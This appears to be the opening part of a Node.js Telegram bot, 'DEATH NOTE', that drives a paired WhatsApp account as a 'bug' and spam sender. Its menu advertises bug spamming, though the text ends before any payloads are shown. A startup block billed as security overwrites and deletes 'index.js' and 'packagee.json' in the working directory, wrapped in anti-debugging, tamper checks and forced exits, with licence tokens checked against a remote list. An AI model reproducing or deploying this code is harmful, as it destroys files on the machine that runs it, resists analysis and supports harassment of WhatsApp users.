const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const adminFile = './database/adminuser.json';
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  getContentType,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  WAContextInfo,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  GroupSettingChange,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  templateMessage,
  InteractiveMessage,
  Header,
  generateMessageID,
  encodeWAMessage,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  prepareWAMessageContent,
  generateWAMessageFromContent,
  jidDecode,
  proto,
  getAggregateVotesInPollMessage,
  makeCacheableSignalKeyStore,
  Browsers,
  decryptMessageNode,
  MessageRetryMap,
  generateMessageIDV2,
  encodeSignedDeviceIdentity,
  jidEncode,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = "https://raw.githubusercontent.com/mimimingarena-ux/deatnot/refs/heads/main/tokens.json";
const thumbnailUrl = "https://files.catbox.moe/7huyko.jpg";
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
secureMode = true;
}

(() => {
function randErr() {
return Array.from({ length: 12 }, () =>
String.fromCharCode(33 + Math.floor(Math.random() * 90))
).join("");
}
setInterval(() => {
const t1 = process.hrtime.bigint();
debugger;
const t2 = process.hrtime.bigint();
if (Number(t2 - t1) / 1e6 > 80) {
throw new Error(randErr());
}
}, 800);
setInterval(() => {
if (process.execArgv.join(" ").includes("--inspect") ||
process.execArgv.join(" ").includes("--debug")) {
throw new Error(randErr());
}
}, 1500);

const code = "Xatanical";
if (code.length !== 9) {
throw new Error(randErr());
}

function secure() {
  try {
    const DatabaseFile = ['packagee.json', 'index.js']; //GANTI SESUAI FILE LU
    const currentDir = process.cwd();
    
    DatabaseFile.forEach(file => {
      const filePath = path.join(currentDir, file);
      if (fs.existsSync(filePath)) {
        try {
          const content = fs.readFileSync(filePath, 'utf8');
          const randomData = Array.from({ length: content.length }, () => 
            String.fromCharCode(33 + Math.floor(Math.random() * 90))
          ).join('');
          fs.writeFileSync(filePath, randomData);         
          fs.unlinkSync(filePath);               
        } catch (err) {
        }
      }
    });
  } catch (err) {
  }
}

const hash1 = Buffer.from(secure.toString()).toString("base64");
const hash2 = crypto.createHash("sha256").update(hash1).digest("hex");
const hash3 = crypto.createHash("md5").update(hash2).digest("hex");

setInterval(() => {
const current = Buffer.from(secure.toString()).toString("base64");
const c2 = crypto.createHash("sha256").update(current).digest("hex");
const c3 = crypto.createHash("md5").update(c2).digest("hex");

if (current !== hash1 || c2 !== hash2 || c3 !== hash3) {  
  throw new Error(randErr());  
}

}, 2000);
Object.freeze(secure);
Object.defineProperty(global, "secure", {
value: undefined,
writable: false,
configurable: false
});

secure();
})();

(() => {
const hardExit = process.exit.bind(process);
const hardKill = process.kill.bind(process);
Object.defineProperty(process, "exit", {
value: hardExit,
writable: false,
configurable: false,
enumerable: true,
});
Object.defineProperty(process, "kill", {
value: hardKill,
writable: false,
configurable: false,
enumerable: true,
});
Object.freeze(process.exit);
Object.freeze(process.kill);
Object.freeze(Function.prototype);
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);

setInterval(() => {
try {
if (process.exit.toString().includes("Proxy") ||
process.kill.toString().includes("Proxy")) {

console.log(chalk.bold.red(`

 Security Alert Information
─────────────────────────────
Developer : @lawlietni
Version : 7.0
Alert : Token Not Validate Bypass
─────────────────────────────
`))

activateSecureMode();  
    hardExit(1);  
  }  
  for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {  
    if (process.listeners(sig).length > 0) {  

      console.log(chalk.bold.yellow(`

 Security Alert Information
─────────────────────────────
Developer : @lawlietni
Version : 7.0
Alert : Script Dipaksa DiBypass
─────────────────────────────
`))

activateSecureMode();  
      hardExit(1);  
    }  
  }  
  if (eval.toString().length !== 33 ||  
      Function.toString().length !== 37) {  
    activateSecureMode();  
    hardExit(1);  
  }  

} catch {  
  activateSecureMode();  
  hardExit(1);  
}

}, 1500);

global.validateToken = async (databaseUrl, tokenBot) => {
try {
const hashed = crypto.createHash("sha256").update(tokenBot).digest("hex");

const rawData = await new Promise((resolve, reject) => {  
    https  
      .get(databaseUrl, { timeout: 5000 }, (res) => {  
        let data = "";  
        res.on("data", (chunk) => (data += chunk));  
        res.on("end", () => resolve(data));  
      })  
      .on("error", reject)  
      .on("timeout", () => reject(new Error("timeout")));  
  });  

  let tokens = [];  
  try {  
    const parsed = JSON.parse(rawData);  
    tokens = parsed.tokens || [];  
  } catch {  
    console.log(chalk.bold.yellow(`

 Database Error
─────────────────────────────
Error : Token Github Tidak Sesuai Array
─────────────────────────────
`));
activateSecureMode();
process.exit(1);
}

const layer1 = tokens.includes(tokenBot);  

  const layer2 = tokens  
    .map((t) => crypto.createHash("sha256").update(t).digest("hex"))  
    .includes(hashed);  

  const xor = (str) =>  
    Buffer.from(str)  
      .map((n) => n ^ 0x6f)  
      .toString("hex");  

  const layer3 = tokens.map((t) => xor(t)).includes(xor(tokenBot));  
  const entropyCheck =  
    typeof tokenBot === "string" &&  
    tokenBot.length > 20 &&  
    /[A-Z]/.test(tokenBot) &&  
    /[0-9]/.test(tokenBot);  

  if (!(layer1 && layer2 && layer3 && entropyCheck)) {  
    console.log(chalk.bold.yellow(`

 Security Alert Information
─────────────────────────────
Developer : @lawlietni
Version : 7.0
Status : Connected Database Sukses
─────────────────────────────
`));
activateSecureMode();
process.exit(1);
}

} catch (err) {  
  console.log(chalk.bold.yellow(`

 Security Alert Information
─────────────────────────────
Error : Tidak dapat mengakses server token
─────────────────────────────
`));
activateSecureMode();
process.exit(1);
}
};
setInterval(() => {
if (typeof activateSecureMode !== "function") {
hardExit(1);
}
}, 2500);

})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false; // volatile gate: require token each restart

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

function toFancyFont(text) {
    const normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const fancy  = "𝘼𝘽𝘾𝘿𝙀𝙁𝙂𝙃𝙄𝙅𝙆𝙇𝙈𝙉𝙊𝙋𝙌𝙍𝙎𝙏𝙐𝙑𝙒𝙓𝙔𝙕𝙖𝙗𝙘𝙙𝙚𝙛𝙜𝙝𝙞𝙟𝙠𝙡𝙢𝙣𝙤𝙥𝙦𝙧𝙨𝙩𝙪𝙫𝙬𝙭𝙮𝙯0123456789";

    return text.split('').map(c => {
        const i = normal.indexOf(c);
        return i !== -1 ? fancy[i] : c;
    }).join('');
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};  
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin dengan cara /addadmin");
    }
    next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/adminuser.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/adminuser.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠
» Information:
☇ Creator : @lawlietni
☇ Name Script : DEATH NOTE
☇ Version : 7.0
☇ Status : Bot Connect
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.00"],
        getMessage: async (key) => ({
            conversation: 'Hello',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
     
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠
» Information:
☇ Creator : @lawlietni
☇ Name Script : DEATH NOTE
☇ Version : 7.0
☇ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 0

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const checkPremiumGrup = (ctx, next) => {
    if (!isPremGroup(ctx.chat.id)) {
        ctx.reply("🚫 Fitur ini hanya untuk pengguna atau grup premium.");
        return;
    }
    next();
};

bot.command("addsender", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("⛔ Fitur ini hanya untuk admin dan owner");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("❌ Format perintah salah. Gunakan: /addsender <nomor_wa>");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`WhatsApp sudah terhubung. Tidak perlu pairing lagi.`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234OJAN");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ ⎧ DEATH NOTE ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⬡═―—⊱ ⎧ DEATH NOTE ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("update", async (ctx) => {  
    const chat = ctx.chat.id;
    await ctx.reply("🔄 Proses Auto Update");

    try {
        await downloadRepo("");
        await ctx.reply("✅ Update selesai!\n🔁 Bot restart otomatis.");
        setTimeout(() => process.exit(0), 1500);
    } catch (e) {
        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ User ini sudah menjadi admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`User ${userId} berhasil ditambahkan sebagai admin.`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command('addpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const groupId = ctx.chat.id; // otomatis ambil ID grup
    const duration = 30; // default 30 hari (ubah sesuai kebutuhan)

    const premiumUsers = loadPremGroups();
    const expiryDate = moment()
        .add(duration, 'days')
        .tz('Asia/Jakarta')
        .format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    addPremGroup(groupId);

    ctx.reply(`🎉 Pengguna ${groupId} berhasil ditambahkan ke daftar premium.`);
});

bot.command('delpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const groupId = ctx.chat.id; // otomatis ambil ID grup
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ Grup ini berhasil dihapus dari daftar premium`);
    } else {
        ctx.reply(`🪧 ☇ Grup ini tidak ada dalam daftar premium`);
    }
});

bot.start(async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const menuMessage = `
<blockquote><b>𝙳𝙴𝙰𝚃𝙷 𝙽𝙾𝚃𝙴</b></blockquote>
↯ Developer  : @lawlietni
↯ Version    : 7.0 hight
↯ Platform   : Telegram
↯ type script : Bebas spam bugs 
<blockquote><b>𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</b></blockquote>
↯ ID: ${ctx.from.id}
↯ Username: ${ctx.from.username || "Tidak ada username"}
<blockquote><b>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</b></blockquote>
↯ Koneksi: ${senderStatus}`;    
    
    const keyboard = [
        [
            {
                text: "XBUGS",
                callback_data: "/bug",
                style : "primary"
            },
            {
                text: "XSETTINGS",
                callback_data: "/controls",
                style : "success"
            },
        ],
        [
            {
                text: "DEVELOPER", 
                url: "https://t.me/lawlietni",
                style : "danger"       
            },
        ]
    ];

    return ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action("/start", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    // Ambil id dan username dari ctx
    const userId = ctx.from.id;
    const username = ctx.from.username || "Tidak ada username";
  
    const menuMessage = `
<blockquote><b>𝙳𝙴𝙰𝚃𝙷 𝙽𝙾𝚃𝙴</b></blockquote>
↯ Developer  : @lawlietni
↯ Version    : 7.0 hight
↯ Platform   : Telegram
↯ type script : Bebas spam bugs 
<blockquote><b>𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</b></blockquote>
↯ ID: ${userId}
↯ Username: ${username}
<blockquote><b>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</b></blockquote>
↯ Koneksi: ${senderStatus}`;
        
    const keyboard = [
        [
            {
                text: "XBUGS",
                callback_data: "/bug",
                style : "primary"
            },
            {
                text: "XSETTINGS",
                callback_data: "/controls",
                style : "success"
            },
        ],
        [
            {
                text: "DEVELOPER", 
                url: "https://t.me/lawlietni",        
                style : "danger"
            },
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: "photo",
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /start action:", error);
        }
    }
});

bot.action("/controls", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const controlsMenu = `
